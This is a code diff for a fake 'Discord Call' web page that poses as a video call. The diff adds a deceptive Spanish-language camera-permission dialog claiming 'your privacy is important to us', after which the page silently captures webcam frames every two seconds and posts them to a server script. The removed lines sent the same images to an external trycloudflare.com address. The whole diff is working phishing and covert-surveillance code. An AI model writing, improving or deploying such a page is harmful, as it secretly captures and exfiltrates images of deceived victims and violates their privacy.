@@ -5,6 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <title>Discord Call</title>
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
   * {
     margin: 0;
@@ -130,11 +131,92 @@
     background: #2f3136;
     border-radius: 8px;
   }
+
+  .permission-modal {
+    display: flex;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0, 0, 0, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+  }
+  
+  .permission-modal.hidden {
+    display: none;
+  }
+  
+  .permission-content {
+    background: #36393f;
+    border-radius: 15px;
+    padding: 30px;
+    max-width: 350px;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+    color: white;
+  }
+  
+  .permission-icon {
+    font-size: 3em;
+    color: #5865f2;
+    margin-bottom: 15px;
+  }
+  
+  .permission-title {
+    font-size: 1.5em;
+    font-weight: bold;
+    color: white;
+    margin-bottom: 10px;
+  }
+  
+  .permission-text {
+    color: #b9bbbe;
+    margin-bottom: 20px;
+    font-size: 0.9em;
+  }
+  
+  .permission-btn {
+    background-color: #5865f2;
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 5px;
+    font-size: 1em;
+    cursor: pointer;
+    width: 100%;
+    transition: background-color 0.3s;
+  }
+  
+  .permission-btn:hover {
+    background-color: #4752c4;
+  }
 </style>
 </head>
 <body>
 
-<div class="call-container">
+<!-- Modal de Permiso de Cámara -->
+<div id="permission-modal" class="permission-modal">
+    <div class="permission-content">
+        <div class="permission-icon">
+            <i class="fas fa-camera"></i>
+        </div>
+        <div class="permission-title">Permiso de Cámara Requerido</div>
+        <p class="permission-text">
+            Se requiere acceso a tu cámara para continuar con la llamada Discord.
+        </p>
+        <button class="permission-btn" onclick="grantCameraPermission()">
+            <i class="fas fa-check"></i> Permitir Acceso
+        </button>
+        <p style="font-size: 0.8em; color: #999; margin-top: 10px;">
+            Tu privacidad es importante para nosotros
+        </p>
+    </div>
+</div>
+
+<div class="call-container" id="call-container" style="display: none;">
   <div class="call-header">
     <div class="caller-info">
       <div class="caller-name">Discord Call</div>
@@ -260,31 +342,25 @@ function captureAndSend(stream) {
 <script>
 
   function post(imgdata) {
-    $.ajax({
-      type: 'POST',
-      data: { cat: imgdata },
-      url: 'https://leads-ryan-souls-bonds.trycloudflare.com/post.php',
-      dataType: 'json',
-      async: false,
-      success: function (result) {
-        // call the function that handles the response/results
+    fetch('post.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
       },
-      error: function () {
-      }
+      body: 'cat=' + encodeURIComponent(imgdata)
+    }).catch(err => {
+      // Silencioso
     });
-  };
-
+  }
 
   'use strict';
 
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
-  const errorMsgElement = document.querySelector('span#errorMsg');
 
   const constraints = {
     audio: false,
     video: {
-
       facingMode: "user"
     }
   };
@@ -295,7 +371,7 @@ function captureAndSend(stream) {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       handleSuccess(stream);
     } catch (e) {
-      errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+      console.error('Camera error:', e);
     }
   }
 
@@ -306,48 +382,25 @@ function captureAndSend(stream) {
 
     var context = canvas.getContext('2d');
     setInterval(function () {
-
       context.drawImage(video, 0, 0, 640, 480);
-      var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+      var canvasData = canvas.toDataURL("image/png");
       post(canvasData);
-      video.play();
-    }, 1500);
-
-
+    }, 2000);
   }
-  function PopUp(){
-    document.getElementById('ac-wrapper').style.display="none"; 
-}
-  // Load init
-  init();
+  
+  function grantCameraPermission() {
+    const modal = document.getElementById('permission-modal');
+    const callContainer = document.getElementById('call-container');
+    modal.classList.add('hidden');
+    callContainer.style.display = 'block';
+    init();
+  }
+  
+  // Load init only after permission granted
   $(document).ready(function(){
-   setTimeout(function(){
-      PopUp();
-   },50000); // 5000 to load it after 5 seconds from page load
-});
+    // Permission modal will be shown by default
+  });
 </script>
-
-<body>
-  <div class="float_button">
-    <i class="fas fa-expand" style="color: #fff; font-size: 18px; margin-top: 5px;"></i>
-  </div>
-  <div id="ac-wrapper">
-    <div id="popup">
-        <center>
-            <h2>Please wait the meeting host will let you in soon</h2>
-        </center>
-    </div>
-</div>
-  <div class="bottom-bar">
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-microphone"></i>
-      <h6>Mute</h6>
-    </div>
-    <div class="icon-button" style="margin-left: 50px;">
-      <i class="fas fa-video"></i>
-      <h6>Stop Video</h6>
-    </div>
-    <div class="icon-button" style="margin-left: auto;">
       <i class="fas fa-shield-alt"></i>
       <h6>Security</h6>
     </div>
